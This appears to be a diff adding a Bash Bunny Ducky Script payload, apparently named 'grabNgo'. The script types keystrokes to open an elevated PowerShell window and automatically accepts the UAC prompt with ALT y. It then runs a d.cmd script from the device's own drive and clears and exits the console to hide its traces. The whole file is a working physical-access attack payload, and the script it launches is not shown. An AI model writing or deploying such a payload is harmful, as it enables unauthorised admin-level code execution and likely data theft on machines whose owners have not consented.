@@ -1,0 +1,18 @@
+REM Opens Run Window
+GUI r
+DELAY 500
+REM Loads Powershell as Admin
+STRING powershell Start-Process powershell -Verb runAs 
+ENTER
+DELAY 1500
+ALT y
+DELAY 500
+REM Runs Script
+STRING $drive=(gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\grabNgo\d.cmd'
+ENTER
+STRING Start-Process "$drive"
+ENTER
+STRING clear
+ENTER
+STRING EXIT
+ENTER
